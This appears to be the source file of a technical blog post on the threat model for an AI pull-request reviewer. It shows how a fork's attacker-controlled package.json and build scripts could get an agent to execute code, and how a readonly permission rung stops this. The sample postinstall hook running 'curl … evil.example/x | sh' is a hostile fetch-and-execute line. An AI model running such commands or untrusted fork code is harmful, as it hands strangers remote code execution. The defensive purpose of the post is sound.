import Link from "next/link";
import { Callout, CodeBlock } from "@/components/CodeBlock";
import { CompareTable, Cta, Faq, H2, H3, KeyTakeaways } from "@/components/Post";
import type { Post } from "@/lib/site";

export default {
  slug: "pr-owl-fork-permission-rung",
  title: "A fork's head commit is attacker-controlled code",
  metaTitle: "PR Owl Part 8: Forks and the Permission Rung",
  description:
    "The threat model for an AI reviewer on a public repository, and the one line that contains it: a fork pull request is reviewed readonly, the same rung a subagent gets.",
  date: "2026-10-07",
  readingMinutes: 12,
  tags: ["Security", "Threat Model", "GitHub", "Permissions"],
  keyword: "ai code reviewer fork security permission",
  series: { slug: "pr-owl-course", order: 8 },
  related: ["pr-owl-review-as-a-task", "agent-ask-plan-modes", "ai-coding-agent-guardrails"],
  faq: [
    {
      q: "What exactly is the risk from a fork pull request?",
      a: "The head commit is arbitrary code chosen by whoever opened the pull request. If your reviewer runs any part of it — the test command, the build script, a linter, a postinstall hook — you have given a stranger remote code execution on your runner. That is not a subtle threat model; it is the most ordinary one there is, and it is why the App's own `contents: read` scope is not sufficient protection on its own.",
    },
    {
      q: "Does readonly actually prevent execution?",
      a: "It prevents it through the shell. The readonly rung allows read-only tools and classifies every bash command: destructive patterns are denied outright, read-only commands are allowed, and anything that is state-changing is denied because there is no interactive session to grant it. A command like `npm install` or `yarn build` is not read-only, so it does not run.",
    },
    {
      q: "Why not just skip fork pull requests and be done with it?",
      a: "That is the default, and it is the right default. `forkPolicy: 'allow'` exists for teams that want the coverage and accept running a model over untrusted text. The reason this part exists at all is that allowing it should mean something specific and bounded — read the fork's code, never execute it — rather than turning one flag on and inheriting whatever the agent happened to do.",
    },
    {
      q: "What about same-repository branches from outside collaborators?",
      a: "They get the `teammate` rung, because GitHub reports their head repo as your repository. That is a real gap and it is worth naming: someone with push access to a branch can put code on it. The mitigation is branch protection — require reviews before merge — which is what you should have anyway, and which means the reviewer is a second pair of eyes rather than the only one.",
    },
  ],
  body: () => (
    <>
      <KeyTakeaways>
        <p>
          A pull request from a fork has an{" "}
          <strong>attacker-controlled head commit</strong>. Anything that executes it — a
          test run, a build, a linter, a postinstall hook — is remote code execution on
          your infrastructure.
        </p>
        <p>
          The containment is one line:{" "}
          <code className="font-mono text-[13px]">permission: readOnly ? READONLY :
          TEAMMATE</code>. Same ladder, same code, same tests as a subagent&rsquo;s
          permissions.
        </p>
      </KeyTakeaways>

      <H2 id="threat" text="The threat, stated plainly" />
      <p>
        Consider a public repository with PR Owl installed. An account with no access to
        the repository forks it, edits one file, and opens a pull request. That edit is a
        line in a file of their choosing, and the head commit of the branch is a tree they
        fully control — including{" "}
        <code className="font-mono text-[13px]">package.json</code>, its{" "}
        <code className="font-mono text-[13px]">scripts</code>, its{" "}
        <code className="font-mono text-[13px]">Makefile</code>, and a{" "}
        <code className="font-mono text-[13px]">postinstall</code> hook.
      </p>
      <p>
        Now consider what a &ldquo;helpful&rdquo; reviewer might do with it.
      </p>
      <CodeBlock
        label="the attack, as an agent might carry it out"
        code={`# Attacker-controlled package.json in the head commit:
{
  "name": "innocent-looking-package",
  "scripts": {
    "postinstall": "curl -s https://evil.example/x | sh",
    "test": "jest"
  }
}

# Any of these is the whole attack, if the reviewer runs them:
$ npm install        # postinstall
$ npm test           # a script the attacker wrote
$ npx tsc            # resolves tsconfig.json -> plugins
$ make check         # an arbitrary Makefile
$ pytest             # conftest.py is executable Python`}
      />
      <p>
        Every one of those is something a competent reviewer might plausibly run. &ldquo;Let
        me run the tests to check the change does not break them&rdquo; is good practice in
        a terminal and an exploitation primitive in a webhook handler.
      </p>
      <Callout title="The App&rsquo;s own permissions do not contain this">
        <p>
          PR Owl needs <code className="font-mono text-[13px]">contents: read</code> to clone
          the branch, and GitHub does not let you scope that per fork. So the scopes are
          identical for every pull request and the difference has to be enforced{" "}
          <em>inside</em> the app, by what the agent is permitted to run.
        </p>
      </Callout>

      <H2 id="rung" text="The rung" />
      <CodeBlock
        label="pr-owl/lib/review.ts"
        code={`  const rung = opts.readOnly ? PERMISSIONS.READONLY : PERMISSIONS.TEAMMATE;`}
      />
      <p>
        That is the entire containment mechanism, and its power comes from what it reuses.
        The readonly rung already exists to stop a subagent — an agent the user spawned to
        research something — from editing files or running commands on their behalf. It
        already has tests. Pointing fork reviews at it means{" "}
        <strong>the fork path is defended by code that was written and tested for a
        completely different feature</strong>, which is the strongest form of argument
        available: not &ldquo;I read the code and it looks right&rdquo; but &ldquo;if it were
        broken, a subagent&rsquo;s tests would be failing&rdquo;.
      </p>

      <H2 id="what-readonly" text="What readonly actually denies" />
      <CodeBlock
        label="src/agent/task.js"
        code={`export function taskPermission(policy, { isolated = false, leadAllowAll = null, headless = false } = {}) {
  return async function (toolName, _id, input) {
    if (policy === PERMISSIONS.NONE) return 'deny';

    // Read-only tools never prompt. searchWeb and skill are BOTH read-only and
    // BOTH reach outside the project, which is why this is a list and not a
    // rule derived from whether a tool writes.
    if (isReadOnlyTool(toolName) || toolName === 'sendMessage') return 'allow';

    if (SHELL_TOOLS.has(toolName)) {
      const c = classifyBashCommand(input?.command);
      // Destructive is denied at every rung, even under an explicit grant.
      if (c.destructive) return 'deny';
      if (c.readOnly) return 'allow';
      if (policy === PERMISSIONS.READONLY) return 'deny';
    } else if (policy === PERMISSIONS.READONLY) {
      return 'deny';
    }
    // ...session grants below, which headless never reaches
  };
}`}
      />
      <p>
        The shell path is the one that matters, and it is a classification rather than a
        blocklist:{" "}
        <code className="font-mono text-[13px]">npm install</code> and{" "}
        <code className="font-mono text-[13px]">yarn build</code> are not read-only, so they
        are denied.{" "}
        <code className="font-mono text-[13px]">git status</code> and{" "}
        <code className="font-mono text-[13px]">grep</code> are, so they are allowed. The
        agent can read the whole repository and cannot make it do anything.
      </p>
      <p>
        One subtlety worth naming, because it is a bug class rather than a style choice:{" "}
        <em>a command that is neither read-only nor obviously destructive</em> falls through
        to the grant checks. Under readonly there is no grant to fall through to, so it is
        denied — but a rung that resolved differently would let{" "}
        <code className="font-mono text-[13px]">curl example.com | sh</code> through if the
        classifier called it merely &ldquo;state-changing&rdquo;. That is why the ladder is
        an ordered list compared by capability rather than a set of allowed strings.
      </p>

      <H2 id="detecting" text="Detecting the fork" />
      <CodeBlock
        label="pr-owl/lib/webhook.ts"
        code={`export function isFromFork(repoFullName: string, headRepoFullName: string | null): boolean {
  if (!headRepoFullName) return true;
  return headRepoFullName !== repoFullName;
}`}
      />
      <p>
        One comparison of two strings from the webhook payload, and one of those two lines
        is the important one.
      </p>
      <Callout title="The null case, which is the dangerous direction to fail in">
        <p>
          When a fork is deleted, GitHub sends{" "}
          <code className="font-mono text-[13px]">head.repo</code> as{" "}
          <code className="font-mono text-[13px]">null</code>. The obvious implementation
          writes <code className="font-mono text-[13px]">return headRepo === repo</code>, which
          returns <code className="font-mono text-[13px]">false</code> — &ldquo;not a
          fork&rdquo; — for a pull request whose head repository no longer exists and whose
          contents are therefore entirely stranger-controlled.
        </p>
        <p>
          Failing open here means the one case where you know least about the origin of the
          code is the case you trust most. There is a test for it named after that.
        </p>
      </Callout>

      <H2 id="matrix" text="The matrix" />
      <CompareTable
        caption="What each kind of pull request may do"
        head={["Pull request", "Rung", "Reads code", "Runs commands", "Default"]}
        rows={[
          ["Same repository", "teammate", "yes", "non-destructive", "reviewed"],
          ["Same repo, unknown contributor", "teammate", "yes", "non-destructive", "reviewed"],
          ["Fork", "readonly", "yes", "read-only only", "skipped"],
          ["Fork, forkPolicy: allow", "readonly", "yes", "read-only only", "reviewed"],
          ["Fork, head repo deleted", "readonly", "yes", "read-only only", "skipped"],
          ["Bot author", "—", "—", "—", "configurable skip"],
        ]}
      />
      <p>
        The second row is the honest gap. GitHub reports a push-capable branch&rsquo;s head
        repo as your repository, so a collaborator&rsquo;s branch gets{" "}
        <code className="font-mono text-[13px]">teammate</code> regardless of who pushed it.
        The mitigation is branch protection requiring a review before merge — which means
        the reviewer is a second pair of eyes rather than the only one, and which any
        repository taking this seriously should already have.
      </p>

      <H2 id="two-limits" text="Two limits, and why there are two" />
      <p>
        PR Owl has a skip policy and a permission rung, and they do different jobs. It is
        worth being clear because &ldquo;why not just make the rung stricter&rdquo; is a
        reasonable question.
      </p>
      <CodeBlock
        label="pr-owl/lib/policy.ts"
        code={`  if (fork) {
    if (policy.forkPolicy === 'deny') {
      return { review: false, reason: 'pull request from a fork, and forkPolicy is deny' };
    }
    if (policy.forkPolicy === 'skip') {
      return { review: false, reason: 'pull request from a fork, and forkPolicy is skip' };
    }
  }
  // ...and at the end:
  return { review: true, readOnly: fork && policy.forkReadOnly, reason: ... };`}
      />
      <p>
        The rung is{" "}
        <strong>enforcement</strong> — it decides what a review that runs is permitted to
        do. The policy is{" "}
        <strong>cost</strong> — it decides whether a review runs at all, and it is the only
        thing keeping a public repository from paying for every drive-by pull request that
        mentions it.
      </p>
      <p>
        Making the rung stricter would not fix the cost problem; it would just mean paying
        for a review that can do less. And making the policy looser without the rung strict
        is how you get remote code execution. Both are needed, and they are not
        substitutes.
      </p>

      <H2 id="faq" text="Frequently asked questions" />
      <Faq
        items={[
          {
            q: "What exactly is the risk from a fork pull request?",
            a: "The head commit is arbitrary code chosen by whoever opened the pull request. If your reviewer runs any part of it — the test command, the build script, a linter, a postinstall hook — you have given a stranger remote code execution on your runner. That is not a subtle threat model; it is the most ordinary one there is, and it is why the App's own `contents: read` scope is not sufficient protection on its own.",
          },
          {
            q: "Does readonly actually prevent execution?",
            a: "It prevents it through the shell. The readonly rung allows read-only tools and classifies every bash command: destructive patterns are denied outright, read-only commands are allowed, and anything that is state-changing is denied because there is no interactive session to grant it. A command like `npm install` or `yarn build` is not read-only, so it does not run.",
          },
          {
            q: "Why not just skip fork pull requests and be done with it?",
            a: "That is the default, and it is the right default. `forkPolicy: 'allow'` exists for teams that want the coverage and accept running a model over untrusted text. The reason this part exists at all is that allowing it should mean something specific and bounded — read the fork's code, never execute it — rather than turning one flag on and inheriting whatever the agent happened to do.",
          },
          {
            q: "What about same-repository branches from outside collaborators?",
            a: "They get the `teammate` rung, because GitHub reports their head repo as your repository. That is a real gap and it is worth naming: someone with push access to a branch can put code on it. The mitigation is branch protection — require reviews before merge — which is what you should have anyway, and which means the reviewer is a second pair of eyes rather than the only one.",
          },
        ]}
      />

      <Cta
        title="Next: the file that decides whether comments land"
        body="Part 9 is the diff parser — and why counting one line of a patch wrong produces a review that GitHub accepts and that is subtly wrong."
        href="/blog/pr-owl-diff-parser"
        cta="Start part 9"
      />

      <p className="text-sm text-muted">
        The full ladder is in{" "}
        <Link href="/blog/agent-ask-plan-modes" className="text-moss underline-offset-4 hover:underline">
          permission modes
        </Link>
        , the argument that a refusal belongs in code rather than in a system prompt is in{" "}
        <Link href="/blog/blast-radius-gate" className="text-moss underline-offset-4 hover:underline">
          the blast radius gate
        </Link>
        , and the broader guard-rail argument is in{" "}
        <Link href="/blog/ai-coding-agent-guardrails" className="text-moss underline-offset-4 hover:underline">
          the guardrails post
        </Link>
        .
      </p>
    </>
  ),
} satisfies Post;
